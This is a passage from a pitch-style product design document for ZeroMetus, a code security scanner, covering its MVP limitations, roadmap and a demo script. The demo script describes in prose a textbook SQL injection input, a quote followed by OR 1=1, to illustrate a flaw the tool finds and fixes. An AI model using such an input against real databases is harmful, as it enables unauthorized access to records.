> "When we built ZeroMetus, we asked ourselves: would we upload our own company's code to this platform? The answer had to be yes. That's why we built security and privacy into the foundation — code isolation, no execution, human approval for all fixes, and complete audit trails. We're asking developers to trust us with their most valuable asset: their source code. We take that responsibility seriously."

---

## 8. MVP Limitations

An honest MVP acknowledges what it cannot do yet. This demonstrates maturity and builds credibility with judges and investors.

### Limitation 1: No Automatic Code Modification

**What the MVP Does:**
- Suggests fixes as text/code blocks
- Users manually copy and apply fixes

**What It Does Not Do:**
- Create pull requests automatically
- Modify files directly
- Integrate with IDEs to apply changes

**Why This Is Smart:**
- Reduces liability and trust requirements
- Avoids complex git/file system integrations
- Keeps scope achievable
- Users prefer control in early adoption

**Roadmap Path:**
Phase 2 will add GitHub PR creation for approved fixes.

### Limitation 2: Limited Language Support

**What the MVP Supports:**
- Python
- JavaScript / TypeScript
- Java
- Basic SQL pattern detection

**What It Does Not Support Yet:**
- C / C++ (memory safety analysis is complex)
- Rust (different vulnerability classes)
- Mobile (Swift, Kotlin)
- Infrastructure (Terraform, CloudFormation)

**Why This Is Smart:**
- Focus on highest-demand languages first
- Python and JavaScript cover 60%+ of web applications
- Quality over breadth for MVP

**Roadmap Path:**
Phase 2 adds Go, PHP, Ruby. Phase 3 adds enterprise languages.

### Limitation 3: No CI/CD Integration

**What the MVP Does:**
- Manual scans initiated by users
- Dashboard-based workflow

**What It Does Not Do:**
- API for pipeline integration
- GitHub Actions / GitLab CI plugins
- Webhook triggers on push/PR

**Why This Is Smart:**
- CI/CD requires production-grade reliability
- Must not block deployments due to our outage
- Requires SLA commitments we cannot yet make
- Enterprise feature that requires enterprise pricing

**Roadmap Path:**
Phase 3 introduces API and CI/CD plugins.

### Limitation 4: Single-User Focus

**What the MVP Does:**
- Full functionality for individual developers
- Projects owned by one user

**What It Does Not Do:**
- Team workspaces
- Role-based permissions
- Shared dashboards
- Organization billing

**Why This Is Smart:**
- Individual developers make purchase decisions
- Team features require complex permission systems
- Prove value to individuals before selling to teams

**Roadmap Path:**
Phase 2 adds team invitations. Phase 3 adds organization features.

### Limitation 5: No Custom Rule Configuration

**What the MVP Does:**
- Pre-configured rule set based on OWASP Top 10
- Standard severity classifications

**What It Does Not Do:**
- Let users enable/disable specific rules
- Allow custom rule definitions
- Support organization-specific policies

**Why This Is Smart:**
- Opinionated defaults reduce decision fatigue
- Customization requires enterprise support infrastructure
- Most users benefit from standard rules

**Roadmap Path:**
Phase 3 adds rule configuration and custom policies.

### Limitation 6: No Offline or On-Premise Deployment

**What the MVP Does:**
- SaaS-only deployment
- All processing in our cloud infrastructure

**What It Does Not Do:**
- Self-hosted installation
- Air-gapped deployment
- On-premise enterprise deployment

**Why This Is Smart:**
- Simplifies operations dramatically
- Enables rapid iteration
- Reduces support burden
- Most startups and individuals prefer SaaS

**Roadmap Path:**
Phase 3 explores enterprise on-premise options.

---

## 9. Roadmap

### Phase 1: MVP (Current Release)

**Timeline:** Months 1-3

**Objectives:**
- Prove core value proposition
- Acquire first 1,000 users
- Gather feedback for prioritization

**Deliverables:**
- Paste, file, ZIP, and GitHub URL input methods
- Rule-based scanning for Python, JavaScript, Java
- AI explanations for all detected vulnerabilities
- AI fix suggestions for common patterns
- User dashboard with project management
- Basic authentication system

**Success Metrics:**
- User registration rate
- Scans per active user
- Fix suggestion acceptance rate
- User retention at 30 days

### Phase 2: Advanced AI and Repository Analysis

**Timeline:** Months 4-8

**Objectives:**
- Improve fix quality and coverage
- Enable team collaboration
- Expand language support

**Deliverables:**
- **Enhanced AI Fixes:** Better context understanding, support for more complex fixes
- **GitHub PR Integration:** Approved fixes create pull requests automatically
- **Team Workspaces:** Invite collaborators, shared project views
- **Expanded Languages:** Go, PHP, Ruby, C#
- **Historical Comparison:** Track security posture over time
- **IDE Extensions:** VS Code extension for in-editor scanning
- **Scheduled Scans:** Automatic periodic scans for connected repositories

**Success Metrics:**
- Fix acceptance rate improvement
- Team adoption rate
- Expansion beyond individual developers

### Phase 3: Enterprise and CI/CD Security Agent

**Timeline:** Months 9-14

**Objectives:**
- Serve enterprise customers
- Become part of CI/CD pipelines
- Achieve revenue sustainability

**Deliverables:**
- **CI/CD Integration:** GitHub Actions, GitLab CI, Jenkins plugins
- **API Access:** Full REST API for custom integrations
- **Policy Enforcement:** Fail builds based on configurable thresholds
- **Organization Management:** Admin console, SSO, audit compliance
- **Custom Rules:** Organization-specific vulnerability patterns
- **SLA and Support:** Enterprise support tiers
- **On-Premise Option:** Self-hosted deployment for regulated industries
- **Compliance Reporting:** SOC 2, HIPAA-ready documentation

**Success Metrics:**
- Enterprise customer acquisition
- CI/CD integration adoption
- Revenue per customer

### Long-Term Vision (Phase 4+)

- **Security Training Platform:** Gamified learning using real vulnerability examples
- **Vulnerability Prediction:** ML models that predict where vulnerabilities will emerge
- **Remediation Automation:** Agent that can propose and test fixes autonomously
- **Supply Chain Security:** Dependency analysis and SBOM generation
- **Bug Bounty Integration:** Connect with platforms like HackerOne

---

## 10. Why This MVP Wins Competitions

### What Judges Should Notice

**1. This Solves a Real Problem**
Developer security tools either overwhelm users with noise or are too complex to set up. ZeroMetus provides immediate value (paste code → get results) with depth (AI explanations and fixes) that grows with user sophistication.

**2. The AI Positioning Is Defensible**
We are not claiming "AI scans your code" (vague). We clearly separate detection (rules), reasoning (AI), and generation (AI) — showing we understand the technology, not just the buzzwords.

**3. The Product Design Is Complete**
This is not a feature list; it is a product. We have defined user roles, complete user journeys, specific page designs, and clear error handling. Judges can visualize using this product.

**4. The Limitations Are Honest**
We explicitly state what we do not do and why. This demonstrates maturity. We are not claiming to solve everything on day one.

**5. The Roadmap Is Credible**
Each phase builds logically on the previous. We start with individual developers (easiest to acquire), expand to teams (viral growth), then enterprise (revenue). This is standard SaaS playbook executed thoughtfully.

**6. Security Is Foundational**
We are a security product that takes its own security seriously. Code isolation, no execution, human approval, audit logs — this shows we understand the domain.

### Why This Is More Than a Demo

A demo shows that something can work once.

This MVP design shows:
- How it works for different user types
- What happens when things go wrong
- How users progress from first visit to power user
- Why architectural decisions were made
- What we intentionally excluded and why
- How we plan to evolve

This is a product strategy, not a prototype.

### Why This Is a Real Product Direction

**Market Timing:**
- "Shift left" security is an industry mandate
- AI tools are now capable of nuanced code understanding
- Developer tools are a proven SaaS category
- Supply chain attacks have made code security front-page news

**Business Model Clarity:**
- Free tier drives adoption
- Pro tier for individuals who want more scans and features
- Team tier for startups
- Enterprise tier for large organizations
- Clear value metric: vulnerabilities detected and fixed

**Competitive Moat:**
- AI models improve with usage data (with permission)
- Community-driven rule contributions
- Integration ecosystem lock-in
- Brand trust built through transparency

**Team Execution:**
- MVP scope is achievable in 3 months with a small team
- No massive infrastructure investment required initially
- Can validate market before significant funding

---

## Appendix: Demo Script Narrative

For pitch presentations, the following narrative walks through the product:

> "Let me show you ZeroMetus in action.
>
> I'm a developer who just wrote some Python code for a new feature. I want to quickly check if I've introduced any security issues.
>
> I paste my code here — no signup needed for a quick scan. I hit 'Scan' and in about 5 seconds, I see results: one critical issue detected.
>
> I click on it. It's a SQL injection vulnerability on line 23. But unlike other tools, I don't just see a warning — I see an explanation.
>
> The AI tells me: 'This query concatenates user input directly. An attacker could input a single quote followed by OR 1=1 to access all records.'
>
> Now I understand the actual risk.
>
> Below that, I see a suggested fix. The AI has rewritten my query using parameterized statements. It shows me before and after, and explains why this change works.
>
> I click 'Approve Fix,' copy the code, and paste it into my editor. Done.
>
> I've gone from insecure code to secure code in under two minutes, and I've actually learned something.
>
> That's ZeroMetus: security that explains itself."

---

## Document Metadata

**Document Title:** ZeroMetus — Product Design Document  
**Version:** 1.0  
**Status:** MVP Specification  
**Last Updated:** January 2026  
**Classification:** Competition Submission / Pitch Material

---

*This document represents the complete product design for ZeroMetus MVP. It is intended to demonstrate engineering thinking, product maturity, and market understanding to competition judges and potential investors.*
